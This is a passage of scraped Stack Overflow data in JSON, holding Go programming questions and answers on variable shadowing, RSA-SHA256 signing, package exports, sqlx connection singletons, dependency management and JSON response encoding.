# ADD THIS LINE, AND DO = INSTEAD OF := ON NEXT LINE\n        db, err = sqlx.Connect(\"postgres\", \"user=foo dbname=bar sslmode=disable\")\n        if err != nil {\n            log.Fatalln(err)\n        }\n\n    }\n\n    return db\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 27, "favorite_count": 0, "accepted_answer_id": 52941417, "answer_count": 1, "score": -1, "last_activity_date": 1540270463, "creation_date": 1540270080, "question_id": 52941360, "link": "https://stackoverflow.com/questions/52941360/assign-local-result-to-outer-scope", "title": "Assign local result to outer scope", "body": "<p>I have this block of code. The problem is in the func, I am trying to assign to the db var in outer scope, but it ends up being declared as a local variable.</p>\n\n<pre><code>var db *sqlx.DB\n\nfunc GetDatabaseConnection() *sqlx.DB {\n\n    if db == nil {\n\n        db, err := sqlx.Connect(\"postgres\", \"user=foo dbname=bar sslmode=disable\")\n        if err != nil {\n            log.Fatalln(err)\n        }\n\n    }\n\n    return db\n}\n</code></pre>\n\n<p>my question is, regarding this line:</p>\n\n<pre><code>db, err := sqlx.Connect(...)\n</code></pre>\n\n<p>how can I assign <code>db</code> to the outer scope, and not declare it as a local varible?</p>\n"}, {"tags": ["go", "cryptography"], "comments": [{"owner": {"reputation": 8643, "user_id": 1718554, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/n3jD1.jpg?s=128&g=1", "display_name": "Luke Joshua Park", "link": "https://stackoverflow.com/users/1718554/luke-joshua-park"}, "edited": false, "score": 0, "creation_date": 1540266495, "post_id": 52940838, "comment_id": 92790366, "body": "I assume you&#39;ve seen the built-in <a href=\"https://golang.org/pkg/crypto/rsa/\" rel=\"nofollow noreferrer\"><code>crypto&#47;rsa</code></a> package, so show us what you&#39;ve tried and we can guide you from there."}, {"owner": {"reputation": 189, "user_id": 3764392, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/741c8ea1b53b56e450a377fd79d71e4e?s=128&d=identicon&r=PG&f=1", "display_name": "Adam", "link": "https://stackoverflow.com/users/3764392/adam"}, "reply_to_user": {"reputation": 8643, "user_id": 1718554, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/n3jD1.jpg?s=128&g=1", "display_name": "Luke Joshua Park", "link": "https://stackoverflow.com/users/1718554/luke-joshua-park"}, "edited": false, "score": 0, "creation_date": 1540267053, "post_id": 52940838, "comment_id": 92790483, "body": "@LukeJoshuaPark I am currently blackbox integration against a third party API, though with this solution the application gives back an invalid signature. I will not need the decryption part I believe, i will just send the base64Enc(encrypted) string to the third party API"}, {"owner": {"reputation": 36469, "user_id": 238704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VgOZI.png?s=128&g=1", "display_name": "President James K. Polk", "link": "https://stackoverflow.com/users/238704/president-james-k-polk"}, "edited": false, "score": 0, "creation_date": 1540334938, "post_id": 52940838, "comment_id": 92824872, "body": "That the java class is named <code>Signature</code> should give you a hint that you want RSA   signature methods, not encryption methods."}], "answers": [{"tags": [], "owner": {"reputation": 189, "user_id": 3764392, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/741c8ea1b53b56e450a377fd79d71e4e?s=128&d=identicon&r=PG&f=1", "display_name": "Adam", "link": "https://stackoverflow.com/users/3764392/adam"}, "is_accepted": false, "score": 2, "last_activity_date": 1540344160, "creation_date": 1540344160, "answer_id": 52959856, "question_id": 52940838, "link": "https://stackoverflow.com/questions/52940838/golang-equivalent-of-javas-sha256withrsa/52959856#52959856", "title": "Golang equivalent of Java&#39;s SHA256withRSA", "body": "<p>Figured it out if someone stumbled on the same question, here's how it works in Go</p>\n\n<pre><code>func main() {\n    privateKey := loadPrivateKey()\n    h := sha256.New()\n    h.Write([]byte(`your message`))\n    d := h.Sum(nil)\n\n    signature, err := rsa.SignPKCS1v15(rand.Reader, privateKey, crypto.SHA256, d)\n    if err != nil {\n        panic(err)\n    }\n\n    fmt.Printf(\"Signature in byte: %v\\n\\n\", signature)\n\n    encodedSig := base64.StdEncoding.EncodeToString(signature)\n\n    fmt.Printf(\"Encoded signature: %v\\n\\n\", encodedSig)\n}\n</code></pre>\n"}], "owner": {"reputation": 189, "user_id": 3764392, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/741c8ea1b53b56e450a377fd79d71e4e?s=128&d=identicon&r=PG&f=1", "display_name": "Adam", "link": "https://stackoverflow.com/users/3764392/adam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 779, "favorite_count": 2, "answer_count": 1, "score": 4, "last_activity_date": 1540344222, "creation_date": 1540266217, "last_edit_date": 1540344222, "question_id": 52940838, "link": "https://stackoverflow.com/questions/52940838/golang-equivalent-of-javas-sha256withrsa", "title": "Golang equivalent of Java&#39;s SHA256withRSA", "body": "<p>Is there any Golang equivalent of Java's <code>java.security.Signature</code>'s SHA256withRSA? A couple of research is that I could not simple calculate the SHA256 hash and then signing it with RSA.</p>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 1, "creation_date": 1540266632, "post_id": 52940860, "comment_id": 92790390, "body": "kinda lame but I can live with it"}, {"owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "edited": false, "score": 2, "creation_date": 1540267269, "post_id": 52940860, "comment_id": 92790543, "body": "I&#39;m not sure why you&#39;d ever want to do this? Why wouldn&#39;t whatever is importing <code>models</code> just import <code>huru&#47;models&#47;person</code>?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540269655, "post_id": 52940860, "comment_id": 92790999, "body": "It could just import <code>huru&#47;models</code>, and then do <code>models.person.X</code>, not a big deal, just a different way of organizing things. When you have a lot of models that change/update, it&#39;s a nicety."}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540270732, "post_id": 52940860, "comment_id": 92791318, "body": "@MrCholo And in practice you won&#39;t worry much about this; any decent Go text editor / IDE will automatically add the proper imports for you."}], "tags": [], "owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "is_accepted": false, "score": 8, "last_activity_date": 1540266370, "creation_date": 1540266370, "answer_id": 52940860, "question_id": 52940748, "link": "https://stackoverflow.com/questions/52940748/export-imports-with-golang/52940860#52940860", "title": "Export imports with Golang", "body": "<blockquote>\n  <p>[I]s it possible to export person from this models.go file, in a person namespace like with TypeScript/node.js?</p>\n</blockquote>\n\n<p>No.</p>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1541146571, "post_id": 53113729, "comment_id": 93124190, "body": "this question/OP is about exporting the Person type from the logic package"}, {"owner": {"reputation": 78, "user_id": 10567252, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sZyTZ.jpg?s=128&g=1", "display_name": "Praveen Raj", "link": "https://stackoverflow.com/users/10567252/praveen-raj"}, "edited": false, "score": 0, "creation_date": 1541152385, "post_id": 53113729, "comment_id": 93126838, "body": "Exporting Person type from model package (from person.go file) to logic package."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1541182180, "post_id": 53113729, "comment_id": 93142244, "body": "Exporting Person type from logic package. Is what I want to do."}, {"owner": {"reputation": 78, "user_id": 10567252, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sZyTZ.jpg?s=128&g=1", "display_name": "Praveen Raj", "link": "https://stackoverflow.com/users/10567252/praveen-raj"}, "edited": false, "score": 0, "creation_date": 1541223804, "post_id": 53113729, "comment_id": 93151707, "body": "Then reverse my solution. Define Person type in any go file under logic package. Then use it wherever you want across the project."}], "tags": [], "owner": {"reputation": 78, "user_id": 10567252, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sZyTZ.jpg?s=128&g=1", "display_name": "Praveen Raj", "link": "https://stackoverflow.com/users/10567252/praveen-raj"}, "is_accepted": false, "score": -1, "last_activity_date": 1541140604, "creation_date": 1541140604, "answer_id": 53113729, "question_id": 52940748, "link": "https://stackoverflow.com/questions/52940748/export-imports-with-golang/53113729#53113729", "title": "Export imports with Golang", "body": "<p>Yes, We can export struct from file to another file(or package) like other languages.</p>\n\n<blockquote>\n  <p>person.go</p>\n</blockquote>\n\n<pre><code>package models\n\n// struct name should starts with Capital letter to export\ntype Person struct {\n    Name string\n    age int\n}\n</code></pre>\n\n<p>If the importing file is in the same package(models), then no need to import. Straight away you can use like this:</p>\n\n<blockquote>\n  <p>details.go</p>\n</blockquote>\n\n<pre><code>package models\n\nvar perObj Person\n\nfunc abc() {\n    perObj.Name = \"xyz\"\n}\n</code></pre>\n\n<p>If the importing file is in some other package, then import models package.</p>\n\n<blockquote>\n  <p>businesslogic.go</p>\n</blockquote>\n\n<pre><code>package logic\n\nimport (\n    \"../../models\"\n)\n\nvar perObj Person\n\nfunc abc() {\n    perObj.Name = \"xyz\"\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2867, "user_id": 2867881, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/61Npk.jpg?s=128&g=1", "display_name": "Vikash Pathak", "link": "https://stackoverflow.com/users/2867881/vikash-pathak"}, "is_accepted": false, "score": 2, "last_activity_date": 1618118666, "last_edit_date": 1618118666, "creation_date": 1557565211, "answer_id": 56088779, "question_id": 52940748, "link": "https://stackoverflow.com/questions/52940748/export-imports-with-golang/56088779#56088779", "title": "Export imports with Golang", "body": "<p>@MrCholo there is a little difference in golang concept here. The golang structs available under namespace scoped.</p>\n<p>Like as per example</p>\n<pre><code>package models\n\n// struct name should starts with Capital letter to export\ntype Person struct {\n    Name string\n    age int\n}\n</code></pre>\n<p>The <code>Person</code> struct will be available in all files scoped under same namespace(ex. <code>models</code>). You don't need to import that.</p>\n<p>But if you would like to access outside the <code>models</code> namespace you'll have to import the package <code>models</code> and access the <code>Person</code> object using that.</p>\n<p>ex.</p>\n<pre><code>package anotherpackage\n\nimport (\n    &quot;&lt;path to models&gt;/models&quot;\n)\n\nvar perObj models.Person  // here is how you can access the Person struct\n</code></pre>\n<p>Let me know if it's still not clear to you.</p>\n"}, {"comments": [{"owner": {"reputation": 563, "user_id": 921684, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/pUbv3.png?s=128&g=1", "display_name": "nobody", "link": "https://stackoverflow.com/users/921684/nobody"}, "edited": false, "score": 1, "creation_date": 1614253092, "post_id": 60345877, "comment_id": 117332177, "body": "The benefit of using the embedded approach, is that EmbeddedPerson will have all the  receiver methods of Person, so it automatically implements the same interfaces. I use this technique to re-export custom error types"}], "tags": [], "owner": {"reputation": 2619, "user_id": 2249725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06905a0d11a7662cbadd4daffe029452?s=128&d=identicon&r=PG", "display_name": "mvndaai", "link": "https://stackoverflow.com/users/2249725/mvndaai"}, "is_accepted": false, "score": 1, "last_activity_date": 1582317184, "creation_date": 1582317184, "answer_id": 60345877, "question_id": 52940748, "link": "https://stackoverflow.com/questions/52940748/export-imports-with-golang/60345877#60345877", "title": "Export imports with Golang", "body": "<p>You cannot just pass through a complete package. You can pass through different types by making your own types based on them. If there was a <code>person.Person</code>:</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>package models\n\nimport (\n    \"huru/models/person\"\n)\n\ntype Person person.Person\n\n//or\n\ntype EmbeddedPerson struct{\n    person.Person\n    additional string\n}\n</code></pre>\n\n<p>This has the advantage of allowing you to add your own functions</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>func (p Person) CustomFunc() {}\n</code></pre>\n\n<p>Here is a playground link that shows some of the nuances of this: <a href=\"https://play.golang.org/p/1aLOcmsXHV2\" rel=\"nofollow noreferrer\">https://play.golang.org/p/1aLOcmsXHV2</a></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3378, "favorite_count": 1, "answer_count": 4, "score": 1, "last_activity_date": 1618118666, "creation_date": 1540265415, "question_id": 52940748, "link": "https://stackoverflow.com/questions/52940748/export-imports-with-golang", "title": "Export imports with Golang", "body": "<p>Not sure if this is impossible with Golang. With Node.js, I would do it like so:</p>\n\n<pre><code>import * as person from './person';\nexport {person};\n</code></pre>\n\n<p>with Golang I have <code>models.go</code>:</p>\n\n<pre><code>package models\n\nimport (\n    \"huru/models/person\"\n)\n</code></pre>\n\n<p>is it possible to export person from this models.go file, in a person namespace like with TypeScript/node.js?</p>\n"}, {"tags": ["go", "singleton"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540263923, "post_id": 52940463, "comment_id": 92789864, "body": "thanks after that fix, I get &quot;db declared but not used&quot; that&#39;s a weird one"}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 3, "creation_date": 1540264014, "post_id": 52940463, "comment_id": 92789879, "body": "Have you taken the Tour of Go yet? You should stop and do that. These are very basic, new-to-the-language questions."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540265162, "post_id": 52940463, "comment_id": 92790090, "body": "Eh, I should be able to google this and get an answer to it. If google doesn&#39;t have the answer, I come to SO. Reading the docs doesn&#39;t usually help me, but I will try. I get a lot of information to questions I don&#39;t currently have."}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 2, "creation_date": 1540270510, "post_id": 52940463, "comment_id": 92791254, "body": "Yes, Google does indeed have the answer, but we always recommend the Tour of Go because Go does quite a few things very differently from other languages, and taking ten minutes to go through it and play with the examples will save you a lot of time later on."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 1, "creation_date": 1540302224, "post_id": 52940463, "comment_id": 92809127, "body": "The Tour of Go will give you all the fundamentals, including the answer to this question and many others. Probably 90% of Go questions on SO are answered within the Tour, and it only takes a few minutes to complete."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540403968, "post_id": 52940463, "comment_id": 92857076, "body": "@Adrian it&#39;s better to create questions on SO that are tagged with the name of the error...then golang newbs can search for them...reading the docs and getting 100s of answers to questions you don&#39;t currently have is not how learning happens unfortunately. The docs help for reference - but it would be nice if they had the error and then explanations for the error so people could search quickly."}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540404299, "post_id": 52940463, "comment_id": 92857268, "body": "@MrCholo Most people <i>do</i> learn much from the Tour of Go. It&#39;s unfortunate that you don&#39;t believe you would be one of them. People around here tend to react negatively when they read basic questions that were answered in the Tour."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540404968, "post_id": 52940463, "comment_id": 92857647, "body": "@MichaelHampton I will admit the OP was dumb, I have worked with like 2 statically typed languages before, but whether it should have been <code>func GetDBConnection() *sqlx.DB {</code> or <code>func GetDBConnection() sqlx.DB {</code> (without the asterisk), would the Tour really have given me a quick answer to that? prolly not"}], "tags": [], "owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "is_accepted": true, "score": 3, "last_activity_date": 1540262892, "creation_date": 1540262892, "answer_id": 52940463, "question_id": 52940406, "link": "https://stackoverflow.com/questions/52940406/too-many-arguments-to-return/52940463#52940463", "title": "Too many arguments to return", "body": "<p>You've declared the function <code>GetDBConnection()</code> to return no arguments.</p>\n\n<pre><code>func GetDBConnection() {\n</code></pre>\n\n<p><a href=\"https://tour.golang.org/basics/4\" rel=\"nofollow noreferrer\">You have to tell Go</a> the type of the argument you intend to return:</p>\n\n<pre><code>func GetDBConnection() *sqlx.DB {\n</code></pre>\n\n<p>As for determining the type, I just went to <a href=\"https://github.com/jmoiron/sqlx/blob/master/sqlx.go#L633\" rel=\"nofollow noreferrer\">look at the source code</a>. You could also look at the <a href=\"https://godoc.org/github.com/jmoiron/sqlx#Connect\" rel=\"nofollow noreferrer\">documentation on godoc.org</a>, which is auto-generated from publicly available Go packages.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 210, "favorite_count": 0, "accepted_answer_id": 52940463, "answer_count": 1, "score": -2, "last_activity_date": 1540263995, "creation_date": 1540262492, "last_edit_date": 1540263995, "question_id": 52940406, "link": "https://stackoverflow.com/questions/52940406/too-many-arguments-to-return", "title": "Too many arguments to return", "body": "<p>I have this golang file:</p>\n\n<pre><code>package main\n\nimport (\n    \"log\"\n    \"sync\"\n\n    \"github.com/jmoiron/sqlx\"\n)\n\nvar db *sqlx.DB\nvar once sync.Once\n\n// GetDBConnection whatever\nfunc GetDBConnection() {\n\n    once.Do(func() {\n        db, err := sqlx.Connect(\"postgres\", \"user=tom dbname=jerry password=myPassword sslmode=disable\")\n        if err != nil {\n            log.Fatalln(err)\n        }\n    })\n\n    return db   // &lt;&lt;&lt; error here\n\n}\n</code></pre>\n\n<p>I get this error:</p>\n\n<blockquote>\n  <p><code>Too many arguments to return</code></p>\n</blockquote>\n\n<p>I am just trying to create a singleton pattern and return the db connection. I am not sure if what is returned from sqlx.Connect is type sqlx.DB, that might be the problem. Is there a quick way to determine the return type of <code>sqlx.Connect()</code>?</p>\n"}, {"tags": ["go", "goland"], "comments": [{"owner": {"reputation": 5875, "user_id": 2702398, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/87402651ed56717034035915b95c1ae0?s=128&d=identicon&r=PG&f=1", "display_name": "oakad", "link": "https://stackoverflow.com/users/2702398/oakad"}, "edited": false, "score": 2, "creation_date": 1540255949, "post_id": 52939473, "comment_id": 92788065, "body": "Starting from go 1.11 you can do this: <a href=\"https://github.com/golang/go/wiki/Modules\" rel=\"nofollow noreferrer\">github.com/golang/go/wiki/Modules</a>"}, {"owner": {"reputation": 5044, "user_id": 1276480, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/v8UB8.jpg?s=128&g=1", "display_name": "RayfenWindspear", "link": "https://stackoverflow.com/users/1276480/rayfenwindspear"}, "reply_to_user": {"reputation": 5875, "user_id": 2702398, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/87402651ed56717034035915b95c1ae0?s=128&d=identicon&r=PG&f=1", "display_name": "oakad", "link": "https://stackoverflow.com/users/2702398/oakad"}, "edited": false, "score": 0, "creation_date": 1540259458, "post_id": 52939473, "comment_id": 92788919, "body": "Use of modules (as in @oakad s comment) is recommended now because you can more easily version those libraries. <code>go get</code> (by default) just grabs whatever is current. Also, you don&#39;t need to <code>cd</code> to your <code>$GOHOME</code> to use <code>go get</code>, you can call it from anywhere."}], "answers": [{"comments": [{"owner": {"reputation": 1377, "user_id": 7851030, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/afb284f03d5fc70f3ce6068245ee7dfe?s=128&d=identicon&r=PG&f=1", "display_name": "Achilleus", "link": "https://stackoverflow.com/users/7851030/achilleus"}, "edited": false, "score": 0, "creation_date": 1540271501, "post_id": 52940669, "comment_id": 92791547, "body": "Actually, I was looking for something like <code>dep</code>. But the above suggestion was also helpful. Thanks! <a href=\"https://github.com/golang/dep\" rel=\"nofollow noreferrer\">github.com/golang/dep</a>"}], "tags": [], "owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "is_accepted": true, "score": 6, "last_activity_date": 1540264793, "creation_date": 1540264793, "answer_id": 52940669, "question_id": 52939473, "link": "https://stackoverflow.com/questions/52939473/automatically-import-3rd-party-go-packages/52940669#52940669", "title": "Automatically import 3rd party go packages", "body": "<blockquote>\n  <p>if there is a way to automatically download all the imports</p>\n</blockquote>\n\n<p>You can download all imported pkgs and their dependencies by running <code>go get</code> from the command line.</p>\n\n<blockquote>\n  <p>I am using Goland IDE for my development</p>\n</blockquote>\n\n<p>I'm using Goland too. When imports can't be found (ie the import path is highlighted in red), you can place your typing caret over it and press <code>alt + enter</code> and select <code>go get ...</code> from the popup window to automatically import.</p>\n"}, {"tags": [], "owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "is_accepted": false, "score": 0, "last_activity_date": 1540271897, "creation_date": 1540271897, "answer_id": 52941633, "question_id": 52939473, "link": "https://stackoverflow.com/questions/52939473/automatically-import-3rd-party-go-packages/52941633#52941633", "title": "Automatically import 3rd party go packages", "body": "<p>You can use <code>dep</code> package manager which will go through your code and automatically import all the packages you use in you code. If you are working with >go1.11 I would suggest to use newly added <code>go mod</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1604, "user_id": 3351097, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/yInN3.jpg?s=128&g=1", "display_name": "Maxian Nicu", "link": "https://stackoverflow.com/users/3351097/maxian-nicu"}, "is_accepted": false, "score": 1, "last_activity_date": 1540290279, "creation_date": 1540290279, "answer_id": 52946722, "question_id": 52939473, "link": "https://stackoverflow.com/questions/52939473/automatically-import-3rd-party-go-packages/52946722#52946722", "title": "Automatically import 3rd party go packages", "body": "<p>There are several approaces:</p>\n\n<ul>\n<li>Simply <code>go get github.com/gorilla/mux</code> which will download sources in your <code>$GOPATH</code> and will be resolved automatically when compiling</li>\n<li>Use dependency management (godep, glide[deprecated])</li>\n<li>Use modules (experimental feature in Go 1.11 - Module. <a href=\"https://github.com/golang/go/wiki/Modules\" rel=\"nofollow noreferrer\">Check more here</a>)</li>\n</ul>\n\n<p>If you want a good and stable solution, use <code>dep</code> (.First you have to install it, then run:</p>\n\n<pre><code>cd $GOPATH/src/path/to/project\ndep init\ndep ensure -add github.com/gorilla/mux\n</code></pre>\n\n<p>You will see a new folder <code>vendor</code> in your project and 2 new dependency configuration files <code>Gopkg.lock</code> and <code>Gopkg.toml</code>.\nRead more about godep <a href=\"https://github.com/tools/godep\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>Then run your main file as usual.</p>\n"}], "owner": {"reputation": 1377, "user_id": 7851030, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/afb284f03d5fc70f3ce6068245ee7dfe?s=128&d=identicon&r=PG&f=1", "display_name": "Achilleus", "link": "https://stackoverflow.com/users/7851030/achilleus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3982, "favorite_count": 1, "accepted_answer_id": 52940669, "answer_count": 3, "score": 1, "last_activity_date": 1584005167, "creation_date": 1540254665, "last_edit_date": 1584005167, "question_id": 52939473, "link": "https://stackoverflow.com/questions/52939473/automatically-import-3rd-party-go-packages", "title": "Automatically import 3rd party go packages", "body": "<p>I was wondering if there is a way to automatically download all the imports.\nSo let's assume I need to use <code>github.com/gorilla/mux</code> and several other packages in my code base. Should I manually go to my <code>~/go/src</code> and run <code>go get repo</code> or is there a smarter way of doing dependency management. I am using Goland IDE for my development.</p>\n"}, {"tags": ["go", "struct", "slice"], "answers": [{"tags": [], "owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "is_accepted": true, "score": 2, "last_activity_date": 1540246015, "last_edit_date": 1540246015, "creation_date": 1540245344, "answer_id": 52938290, "question_id": 52938206, "link": "https://stackoverflow.com/questions/52938206/concatenating-a-string-to-a-slice-of-structs/52938290#52938290", "title": "Concatenating a string to a slice of structs", "body": "<p>Write the additional info, the agents and the closing brace to the response:</p>\n\n<pre><code> io.WriteString(w, \"{\")\n io.WriteString(w, AdditionalInfo)\n json.NewEncoder(w).Encode(AllAgents)\n io.WriteString(w, \"]}\")  // closing ] for data and closing } for root\n</code></pre>\n\n<p>Note this encodes two levels of <code>[ ]</code> around the agents. It's unclear if that's what you want.</p>\n\n<p>An alternate approach is to create a Go value matching the structure of the output and encode that:</p>\n\n<pre><code>v := map[string]interface{}{\n    \"meta\": map[string]interface{}{\n        \"page\":    1,\n        \"pages\":   1,\n        \"perpage\": -1,\n        \"total\":   350,\n        \"sort\":    \"asc\",\n        \"field\":   \"RecordID\",\n    },\n    \"data\": AllAgents,\n }\n if err := json.NewEncoder(w).Encode(v); err != nil {\n    // handle error\n }\n</code></pre>\n\n<p>Again, it's unclear how much nesting you want around agents. You may need this variation:</p>\n\n<pre><code>v := map[string]interface{}{\n    \"meta\": map[string]interface{}{\n        \"page\":    1,\n        \"pages\":   1,\n        \"perpage\": -1,\n        \"total\":   350,\n        \"sort\":    \"asc\",\n        \"field\":   \"RecordID\",\n    },\n    \"data\": []interface{}{AllAgents},\n }\n if err := json.NewEncoder(w).Encode(v); err != nil {\n    // handle error\n }\n</code></pre>\n\n<p>re: Efficiency Creating a slice of the final size is generally more efficient then incrementally growing the slice with <code>append</code>.  There may be some efficenty gained by using  a slice of pointers <code>[]*SingleAgent</code> instead of the slice of struct values <code>[]SingleAgent</code>. </p>\n"}], "owner": {"reputation": 64, "user_id": 1447789, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/ef6c4b2cccc9969ec837ce7163a60fdb?s=128&d=identicon&r=PG", "display_name": "Deliri", "link": "https://stackoverflow.com/users/1447789/deliri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 52938290, "answer_count": 1, "score": -1, "last_activity_date": 1540280233, "creation_date": 1540244879, "last_edit_date": 1540280233, "question_id": 52938206, "link": "https://stackoverflow.com/questions/52938206/concatenating-a-string-to-a-slice-of-structs", "title": "Concatenating a string to a slice of structs", "body": "<p>I'm trying to create an endpoint Go API to be consumed by front end JavaScript graphing library.</p>\n\n<p>What should happen:</p>\n\n<ol>\n<li>/data endpoint to get an array of JSON data.</li>\n<li>The data is just a slice of go structs, just two in this example but it will be over 10000.</li>\n<li>The graphing library expects additional meta data. It's saved as a variable called AdditionalInfo.</li>\n<li>The problem is when I want to encode the AdditionalInfo + AllAgents it won't let me join a string with a slice of structs. </li>\n<li>At the end of the slice of structs there also needs to be ]` to make it valid JSON</li>\n</ol>\n\n<p>Problems: </p>\n\n<ol>\n<li>How do you add additional data at the front and back the slice of structs? </li>\n<li>Is appending a struct to a slice of structs efficient? </li>\n<li><p>Would it be better to create a slice with a known length and then use range to append to it? </p>\n\n<pre><code>package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc main() {\n    port := os.Getenv(\"PORT\")\n    if port == \"\" {\n        port = \"443\"\n        log.Printf(\"Defaulting to port %s\", port)\n    }\n\n    http.HandleFunc(\"/data\", TrySnipped)\n    log.Fatal(http.ListenAndServe(fmt.Sprintf(\":%s\", port), nil))\n\n}\n\nfunc TrySnipped(w http.ResponseWriter, r *http.Request) {\n    w.Header().Add(\"Content-Type\", \"application/json\")\n    var AllAgents []SingleAgent\n    AllAgents = append(AllAgents, FirstAgent)\n    AllAgents = append(AllAgents, SecondAgent)\n\n    json.NewEncoder(w).Encode(AllAgents)\n\n}\n\nvar AdditionalInfo = `\"meta\": {\n            \"page\": 1,\n            \"pages\": 1,\n            \"perpage\": -1,\n            \"total\": 350,\n            \"sort\": \"asc\",\n            \"field\": 